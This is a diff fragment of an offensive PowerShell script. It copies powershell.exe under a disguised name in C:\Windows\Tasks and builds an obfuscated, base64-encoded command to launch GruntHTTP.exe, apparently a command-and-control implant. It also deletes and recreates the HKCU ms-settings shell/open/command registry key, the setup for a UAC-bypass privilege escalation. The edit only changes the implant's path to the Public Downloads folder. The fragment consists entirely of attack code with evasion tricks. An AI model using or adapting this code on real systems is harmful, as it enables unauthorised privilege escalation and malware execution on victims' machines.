@@ -9,7 +9,7 @@
 
 
 function b1946ac92492d2347c6235b4d2611184 {
-    $cmd = "C:\Windows\Tasks\bruh.exe -enc" + " " + [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("c"+"m"+"d"+" "+"/"+"c"+" "+"C"+":"+"\"+"U"+"s"+"e"+"r"+"s"+"\"+"P"+"u"+"b"+"l"+"i"+"c"+"\"+"G"+"r"+"u"+"n"+"t"+"H"+"T"+"T"+"P"+"."+"e"+"x"+"e"))
+    $cmd = "C:\Windows\Tasks\bruh.exe -enc" + " " + [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("c"+"m"+"d"+" "+"/"+"c"+" "+"C"+":"+"\"+"U"+"s"+"e"+"r"+"s"+"\"+"P"+"u"+"b"+"l"+"i"+"c"+"\"+"D"+"o"+"w"+"n"+"l"+"o"+"a"+"d"+"s"+"\"+"G"+"r"+"u"+"n"+"t"+"H"+"T"+"T"+"P"+"."+"e"+"x"+"e"))
     copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
